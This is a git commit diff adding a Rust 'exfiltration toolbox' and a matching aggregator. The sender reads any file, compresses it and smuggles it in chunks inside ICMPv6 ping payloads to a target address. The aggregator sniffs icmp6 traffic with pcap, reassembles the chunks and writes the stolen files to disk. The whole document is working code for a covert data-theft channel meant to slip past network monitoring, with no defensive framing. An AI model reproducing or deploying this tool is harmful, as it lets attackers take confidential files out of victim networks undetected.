a89498094ebfedb6d57d2ce778976002a74e3a8f
obaraelijah <elijahobara357@gmail.com>
2025-05-07 10:35:14 +0300

    feat: Enhanced prototype

--- aggregator/src/capture.rs
+++ aggregator/src/capture.rs
@@ -1,5 +1,144 @@
+use std::collections::HashMap;
+use std::fs::File;
+use std::io::Write;
+
+use etherparse::TransportSlice::Icmpv6;
+use etherparse::{Icmpv6Type, SlicedPacket};
+use log::{debug, error, info, warn};
+use messages::Messages;
+use pcap::{Capture, Error};
+
 use crate::config::Config;
 
-pub async fn start_capture(_config: &Config) -> Result<(), String> {
+/// Start capturing
+pub async fn start_capture(config: &Config) -> Result<(), String> {
+    let mut capture = Capture::from_device(config.interface.interface.as_str())
+        .map_err(|e| {
+            format!(
+                "Couldn't open device {} for capturing: {e}",
+                config.interface.interface
+            )
+        })?
+        .timeout(0)
+        .open()
+        .map_err(|e| {
+            format!(
+                "Couldn't activate device {} for capturing: {e}",
+                config.interface.interface
+            )
+        })?;
+    info!("Device {} open for capturing", config.interface.interface);
+
+    let filter = "icmp6";
+    capture
+        .filter(filter, true)
+        .map_err(|e| format!("Couldn't apply filter: {e}"))?;
+    info!("Applied filter for capture: {filter}");
+
+    let mut file_map: HashMap<u16, (String, u64, Vec<u8>)> = HashMap::new();
+
+    loop {
+        match capture.next_packet() {
+            Ok(packet) => {
+                let packet = SlicedPacket::from_ethernet(packet.data).unwrap();
+                if let Some(Icmpv6(slice)) = packet.transport {
+                    if let Icmpv6Type::EchoRequest(req) = slice.icmp_type() {
+                        if req.seq == 1337 {
+                            if let Ok(msg) = serde_json::from_slice(slice.payload()) {
+                                let msg: Messages = msg;
+                                match msg {
+                                    Messages::Initial {
+                                        file_name,
+                                        file_size,
+                                        identifier,
+                                    } => {
+                                        info!(
+                                            "Received new file start: {file_name} with size {file_size} and ID {identifier}"
+                                        );
+                                        file_map
+                                            .insert(identifier, (file_name, file_size, Vec::new()));
+                                    }
+                                    Messages::EndOfTransmission { identifier } => {
+                                        if let Some((file_name, file_size, data)) =
+                                            file_map.remove(&identifier)
+                                        {
+                                            info!(
+                                                "Received end of transmission for ID {identifier}"
+                                            );
+                                            match lz4_flex::decompress(
+                                                data.as_slice(),
+                                                file_size as usize,
+                                            ) {
+                                                Ok(decompressed) => {
+                                                    File::create(file_name)
+                                                        .map_err(|e| {
+                                                            format!("Error creating file: {e}")
+                                                        })?
+                                                        .write_all(&decompressed)
+                                                        .map_err(|e| {
+                                                            format!("Error writing to file: {e}")
+                                                        })?;
+                                                }
+                                                Err(err) => {
+                                                    warn!("Error decompressing data: {err}")
+                                                }
+                                            }
+                                        }
+                                    }
+                                    _ => {
+                                        debug!("Unexpected packet")
+                                    }
+                                }
+                            } else {
+                                debug!("Could not decode message in payload");
+                            }
+                        } else if file_map.contains_key(&req.seq) {
+                            if let Ok(msg) = serde_json::from_slice(slice.payload()) {
+                                let msg: Messages = msg;
+                                match msg {
+                                    Messages::Data { identifier, data } => {
+                                        file_map
+                                            .entry(identifier)
+                                            .and_modify(|(_, _, d)| d.extend(data));
+                                    }
+                                    _ => {
+                                        debug!("Unexpected packet");
+                                    }
+                                }
+                            }
+                        } else {
+                            debug!(
+                                "Received id: {}, but there's no associated entry in our db",
+                                req.seq
+                            );
+                        }
+                    } else {
+                        debug!("No ICMP echo request");
+                    }
+                } else {
+                    debug!("No icmpv6 received")
+                }
+            }
+            Err(err) => {
+                error!("Error while capturing packet: {err}");
+                match err {
+                    Error::MalformedError(_) => {}
+                    Error::InvalidString => {}
+                    Error::PcapError(_) => {}
+                    Error::InvalidLinktype => {}
+                    Error::TimeoutExpired => {}
+                    Error::NoMorePackets => {}
+                    Error::NonNonBlock => {}
+                    Error::InsufficientMemory => {}
+                    Error::InvalidInputString => {}
+                    Error::IoError(_) => {}
+                    Error::InvalidRawFd => {}
+                    Error::ErrnoError(_) => {}
+                    Error::BufferOverflow => {}
+                }
+            }
+        }
+    }
+
     Ok(())
 }
--- exfiltration/src/main.rs
+++ exfiltration/src/main.rs
@@ -1,6 +1,15 @@
-use std::{net::Ipv6Addr, path::Path};
+use std::fs::File;
+use std::io::Read;
+use std::net::{IpAddr, Ipv6Addr};
+use std::path::Path;
+use std::sync::Arc;
+use std::time::Duration;
 
 use clap::Parser;
+use messages::Messages;
+use rand::random;
+use surge_ping::{Client, Config, PingIdentifier, PingSequence, ICMP};
+use tokio::time::sleep;
 
 /// Exfiltration toolbox
 #[derive(Parser)]
@@ -12,6 +21,8 @@ pub struct Cli {
     /// Path to the file to exfiltrate
     file_path: String,
 }
+
+const CHUNK_SIZE: usize = 2usize.pow(14);
 
 #[tokio::main]
 async fn main() -> Result<(), String> {
@@ -26,6 +37,71 @@ async fn main() -> Result<(), String> {
     if !path.is_file() {
         return Err(format!("Path {} is not a file", cli.file_path));
     }
+
+    let mut file = File::open(path).map_err(|e| format!("Could not open file: {e}"))?;
+
+    let mut content = vec![];
+    file.read_to_end(&mut content)
+        .map_err(|e| format!("Could not read from file: {e}"))?;
+
+    let compressed = lz4_flex::compress(&content);
+
+    let target = IpAddr::V6(cli.target);
+
+    let config = Config::builder().kind(ICMP::V6).build();
+    let client =
+        Arc::new(Client::new(&config).map_err(|e| format!("Could not create ping client: {e}"))?);
+
+    let mut identifier;
+    loop {
+        identifier = random();
+        if identifier == 1337 || identifier == 0 {
+            continue;
+        }
+        break;
+    }
+
+    let initial = Messages::Initial {
+        file_name: path.file_name().unwrap().to_str().unwrap().to_owned(),
+        file_size: content.len() as u64,
+        identifier,
+    };
+
+    client
+        .pinger(target, PingIdentifier(1337))
+        .await
+        .ping(PingSequence(1337), &serde_json::to_vec(&initial).unwrap())
+        .await
+        .unwrap();
+
+    sleep(Duration::from_secs(1)).await;
+
+    // the chunk size is because of the max payload size of ping
+    for chunk in compressed.chunks(CHUNK_SIZE) {
+        let data = Messages::Data {
+            data: chunk.to_vec(),
+            identifier,
+        };
+        let serialized =
+            serde_json::to_vec(&data).map_err(|e| format!("Error serializing data: {e}"))?;
+
+        client
+            .pinger(target, PingIdentifier(1337))
+            .await
+            .send_ping(PingSequence(identifier), &serialized)
+            .await
+            .map_err(|e| format!("Could not send ping: {e}"))?;
+
+        sleep(Duration::from_millis(50)).await;
+    }
+
+    let eot = Messages::EndOfTransmission { identifier };
+    client
+        .pinger(target, PingIdentifier(1337))
+        .await
+        .ping(PingSequence(1337), &serde_json::to_vec(&eot).unwrap())
+        .await
+        .map_err(|e| format!("Couldn't send end of transmission: {e}"))?;
 
     Ok(())
 }
